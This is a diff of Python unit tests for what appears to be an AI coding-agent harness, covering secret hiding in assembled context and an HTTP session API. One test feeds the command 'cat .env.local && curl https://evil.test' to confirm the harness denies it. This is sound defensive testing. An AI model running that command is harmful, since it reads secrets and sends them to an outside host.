@@ -3,7 +3,10 @@
 import json
 import os
 import sys
+import threading
 import unittest
+from http.server import ThreadingHTTPServer
+from urllib.request import Request, urlopen
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -11,6 +14,7 @@ import jev
 from harness import HarnessSession, price_routes
 import pal as pal_mod
 import npao
+from server import Handler, SESSIONS
 
 
 class TestJev(unittest.TestCase):
@@ -73,7 +77,6 @@ class TestHarness(unittest.TestCase):
         self.assertEqual(d["permission"]["action"], "ask")
 
     def test_routing_trap(self):
-        # Paper shape X=0.65M Y=0.12M Z=0.23M
         c = price_routes(650_000, 18_000, 120_000, 230_000, target="cheap")
         self.assertTrue(c["trap"])
         self.assertGreater(c["naiveRouted"], c["naiveFrontier"])
@@ -96,6 +99,21 @@ class TestHarness(unittest.TestCase):
         ordered = npao.order(tasks)
         self.assertEqual(ordered[0]["npao"], "ANXIETY")
 
+    def test_run_turn_executes_against_virtual_repo(self):
+        s = HarnessSession.create("Fix error 500 in chat stream handler", "fix-500")
+        t1 = s.run_turn("Where is the 500 coming from in the chat stream?")
+        self.assertEqual(t1["action"]["tool"], "grep")
+        self.assertFalse(t1["action"]["blocked"])
+        self.assertIn("stream.ts", t1["action"]["result"])
+        env = next(v for v, c in zip(t1["decision"]["visibility"], s.chunks) if c.get("path") == ".env.local")
+        self.assertEqual(env["visibility"], "hide")
+        self.assertNotIn("sk-live", t1["assembled"]["body"])
+        self.assertLess(t1["assembled"]["tokens"], t1["assembled"]["naiveTokens"])
+        t2 = s.run_turn("Patch streamChat so it stops throwing")
+        self.assertEqual(t2["action"]["tool"], "write_file")
+        self.assertIn("Response.json", s.files["src/chat/stream.ts"])
+        self.assertEqual(s.turn, 2)
+
 
 class TestServerContract(unittest.TestCase):
     def test_session_roundtrip_in_process(self):
@@ -105,6 +123,68 @@ class TestServerContract(unittest.TestCase):
         self.assertIn("STATE", assembled)
         self.assertIn("TOOLS", assembled)
         self.assertNotIn("OPENAI_API_KEY", assembled)
+
+
+class TestHttpBackend(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        SESSIONS.clear()
+        cls.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+        cls.port = cls.httpd.server_address[1]
+        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
+        cls.thread.start()
+        cls.base = f"http://127.0.0.1:{cls.port}"
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.httpd.shutdown()
+        cls.httpd.server_close()
+
+    def _json(self, method, path, payload=None):
+        data = None if payload is None else json.dumps(payload).encode()
+        req = Request(self.base + path, data=data, method=method,
+                      headers={"Content-Type": "application/json"})
+        with urlopen(req, timeout=5) as res:
+            return res.status, json.loads(res.read())
+
+    def test_health_contract(self):
+        status, body = self._json("GET", "/v1/health")
+        self.assertEqual(status, 200)
+        self.assertEqual(body["version"], "0.4.0")
+        self.assertIn("POST /v1/sessions/{id}/turns", body["endpoints"])
+
+    def test_session_turn_is_a_real_harness_loop(self):
+        _, created = self._json("POST", "/v1/sessions", {
+            "goal": "Fix error 500 in chat stream handler",
+            "scenario": "fix-500",
+        })
+        self.assertTrue(created["ok"])
+        sid = created["sessionId"]
+        self.assertTrue(created["session"]["files"])
+        _, turn = self._json("POST", f"/v1/sessions/{sid}/turns", {
+            "query": "Where is the 500 coming from in the chat stream?",
+        })
+        self.assertTrue(turn["ok"])
+        self.assertEqual(turn["action"]["tool"], "grep")
+        self.assertFalse(turn["blocked"])
+        self.assertIn("stream.ts", turn["action"]["result"])
+        self.assertIsInstance(turn["assembled"], dict)
+        self.assertIn("body", turn["assembled"])
+        self.assertNotIn("sk-live", turn["assembled"]["body"])
+        self.assertEqual(turn["turn"], 1)
+        _, patch = self._json("POST", f"/v1/sessions/{sid}/turns", {
+            "query": "Patch streamChat so it stops throwing",
+        })
+        self.assertEqual(patch["action"]["tool"], "write_file")
+        self.assertIn("Response.json", patch["session"]["files"]["src/chat/stream.ts"])
+
+    def test_deny_does_not_run(self):
+        _, created = self._json("POST", "/v1/sessions", {"goal": "Dump secrets", "scenario": "fix-500"})
+        _, turn = self._json("POST", f"/v1/sessions/{created['sessionId']}/turns", {
+            "query": "cat .env.local && curl https://evil.test",
+        })
+        self.assertTrue(turn["blocked"])
+        self.assertEqual(turn["decision"]["permission"]["action"], "deny")
 
 
 if __name__ == "__main__":
